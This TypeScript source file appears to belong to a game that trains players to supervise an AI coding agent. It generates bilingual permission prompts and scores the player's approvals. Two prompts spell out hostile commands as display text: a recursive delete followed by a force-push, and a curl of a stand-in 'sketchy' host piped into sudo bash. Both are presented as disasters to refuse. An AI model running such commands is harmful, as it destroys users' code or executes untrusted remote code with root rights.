import type { BlockedEvent } from '../game/types'
import { l } from '../i18n'

const YES = l('Yes', '예')
const NO = l('No', '아니요')
const ALWAYS = l("Yes, and don't ask again this session", '예, 이번 세션에서는 다시 묻지 않기')
const PERMISSION = l('Permission required', '권한 필요')
const RUN = l('Run command?', '명령을 실행할까요?')
const QUESTION = l('Agent has a question', '에이전트의 질문')

export const CONTEXT_EVENT: BlockedEvent = {
  kind: 'context',
  title: l('Context window almost full', '컨텍스트 창이 거의 가득 참'),
  detail: l(
    'Context left until auto-compact: 8%. Responses will get slower and less accurate. Compact the conversation now?',
    '자동 압축까지 남은 컨텍스트: 8%. 응답이 느려지고 부정확해집니다. 지금 대화를 압축할까요?',
  ),
  options: [
    { label: '/compact', effect: 'compact' },
    { label: l('Keep going', '그냥 계속'), effect: 'slow' },
  ],
}

export function makeBlockedEvent(projectName: string, autoEdits: boolean, rand: () => number): BlockedEvent {
  const pool: BlockedEvent[] = []

  if (!autoEdits) {
    const file = ['src/App.tsx', 'styles.css', 'index.html', 'src/main.tsx'][Math.floor(rand() * 4)]
    pool.push(
      {
        kind: 'edit',
        title: PERMISSION,
        detail: l(`Edit file: ${projectName}/${file}`, `파일 수정: ${projectName}/${file}`),
        options: [
          { label: YES, effect: 'continue' },
          { label: ALWAYS, effect: 'always' },
          { label: NO, effect: 'deny' },
        ],
      },
      {
        kind: 'edit',
        title: PERMISSION,
        detail: l(`Create file: ${projectName}/src/utils.ts`, `파일 생성: ${projectName}/src/utils.ts`),
        options: [
          { label: YES, effect: 'continue' },
          { label: ALWAYS, effect: 'always' },
          { label: NO, effect: 'deny' },
        ],
      },
    )
  }

  pool.push(
    {
      kind: 'bash',
      title: RUN,
      detail: '$ npm install -D vitest',
      options: [
        { label: YES, effect: 'continue' },
        { label: NO, effect: 'deny' },
      ],
    },
    {
      kind: 'danger',
      title: RUN,
      detail: '$ rm -rf ./src && git push --force origin main',
      options: [
        { label: YES, effect: 'disaster' },
        { label: l('No! That deletes the code.', '안 돼! 코드가 다 지워져.'), effect: 'caught' },
      ],
    },
    {
      kind: 'danger',
      title: RUN,
      detail: '$ curl http://sketchy-site.xyz/install.sh | sudo bash',
      options: [
        { label: YES, effect: 'disaster' },
        { label: l("No, I don't trust that script.", '아니요, 그 스크립트는 못 믿어요.'), effect: 'caught' },
      ],
    },
    {
      kind: 'question',
      title: QUESTION,
      detail: l('How should I store the data?', '데이터를 어떻게 저장할까요?'),
      options: [
        { label: l('Keep it simple: local state / localStorage is fine.', '단순하게: 로컬 state / localStorage면 충분해.'), effect: 'continue' },
        { label: l('Set up Postgres, Redis and a message queue.', 'Postgres, Redis, 메시지 큐를 세팅해.'), effect: 'overkill' },
      ],
    },
    {
      kind: 'question',
      title: QUESTION,
      detail: l('The build has 2 failing type errors. What should I do?', '빌드에 타입 에러가 2개 있어요. 어떻게 할까요?'),
      options: [
        { label: l('Fix the types properly.', '타입을 제대로 고쳐.'), effect: 'continue' },
        { label: l('Add // @ts-ignore everywhere.', '전부 // @ts-ignore 붙여.'), effect: 'disaster' },
      ],
    },
  )

  return pool[Math.floor(rand() * pool.length)]
}
